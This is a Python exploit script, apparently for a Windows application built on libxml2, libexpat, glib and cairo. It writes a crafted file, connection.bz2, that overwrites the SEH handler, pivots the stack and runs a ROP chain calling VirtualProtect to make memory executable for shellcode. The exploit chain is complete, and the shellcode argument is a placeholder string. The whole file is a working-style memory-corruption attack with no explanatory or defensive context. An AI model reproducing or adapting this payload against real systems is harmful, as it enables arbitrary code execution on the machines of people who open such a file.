import struct

def create_payload(shellcode):

    buff = "\x41\x41\x41\x41"
    buff += struct.pack("<L", 0x100205fd) # ADD ESP,10C # RETN   ** [libxml2-2.dll]

    buff += "\x41" * 176

    buff += "\x42\x42\x42\x42" # NSEH
    buff += struct.pack("<L", 0x68e0440e) # SEH -> MOV ESI, DWORD PTR SS:[EBP+C] # MOV DWORD PTR SS:[ESP],ESI # CALL DWORD PTR DS:[ESI+8]
    buff += struct.pack("<L", 0x68f4433b) # ESP = ESI -> PUSH ESI # POP ESP # JMP libexpat.68F4422F # MOV EDX,EDI # ADD ESP,2C # MOV EAX,EDX # POP EBX # POP ESI # POP EDI # POP EBP # RETN

    buff += "\xff\xff\xff\xff"
    buff += "\xff\xff\xff\xff"
    buff += "\xff\xff\xff\xff"
    buff += "\xff\xff\xff\xff"
    buff += "\xff\xff\xff\xff"
    buff += "\xff\xff\xff\xff"
    buff += "\xff\xff\xff\xff"
    buff += "\xff\xff\xff\xff"

    buff += struct.pack("<L", 0x68E30861) #EBX
    buff += "\xEE\xEE\xEE\xEE" #ESI
    buff += struct.pack("<L", 0x68e31861) # EDI -> RETN

    buff += "\xff\xff\xff\xff"

    buff += struct.pack("<L", 0x1007d7d4) # MOV EAX,DWORD PTR SS:[ESP+18] # POP EDI # POP EBX # RETN    ** [libxml2-2.dll]
    buff += struct.pack("<L", 0x68e31861) # EDI
    buff += struct.pack("<L", 0x68E30861) # EBX
    buff += struct.pack("<L", 0x68f414da) # PUSH EAX # POP ESP # POP EBP # RETN    ** [libexpat-1.dll]

    buff += struct.pack("<L", 0x90909090) # THIS IS FILLER

    # RETN SLED
    buff += struct.pack("<L", 0x685D1825) * 10 # RETN

    ROP = [
            0x685e6e0a, # POP EDX # RETN  ** [libglib-2.0.0-0.dll]
            0x90909090, # This value is going to end up in EAX
            0x10069ae1, # POP EBP # RETN    ** [libxml2-2.dll]
            0x68e460f7, # EBP = & PUSH ESP # RETN  ** [libcairo-2.dll]
            0x6860e37d, # POP EAX # RETN  ** [libglib-2.0.0-0.dll]
            0x686b953c, # IAT &VirtualProtect() ** [libglib-2.0.0-0.dll]
            0x68dce64a, # XCHG [EAX],EAX # ADD CL,CL # RETN  **  [libcairo-2.dll]
            0x68eadeaa, # XCHG ESI,EAX # ADD AL,83 # RETN  ** [libcairo-2.dll]
            0x68e3185d, # XOR EBX,EDI # DEC ECX # RETN  ** [libcairo-2.dll] EBX = 0x1000
            0x68eaef78, # XOR EAX,EAX # RETN  ** [libcairo-2.dll]
            0x6860e37d, # POP EAX # RETN  ** [libglib-2.0.0-0.dll]
            0x89FFFB9D, # to xor with next one
            0x68e0fbeb, # XOR EAX,89FFFBDD # RETN  ** [libcairo-2.dll]
            0x68E5d8e2, # XCHG EAX,EDX # RETN  ** [libcairo-2.dll]
            0x68dec59b, # POP ECX # OR CL,CL # RETN  ** [libcairo-2.dll]
            0x68EC4001, # BSS RW section libcairo-2.dll
            0x68e802d9  # PUSHAD # RETN  ** [libcairo-2.dll]
         ]

    buff += ''.join(struct.pack('<L', _) for _ in ROP)

    buff += "\x90\x90\x90\x90" * 4
    buff += shellcode

    buff += "\xCC" * (2000 - len(buff))
    return buff

with open(r"connection.bz2","wb") as f:
    payload = create_payload("n3kn3kn3k")
    f.write(payload)

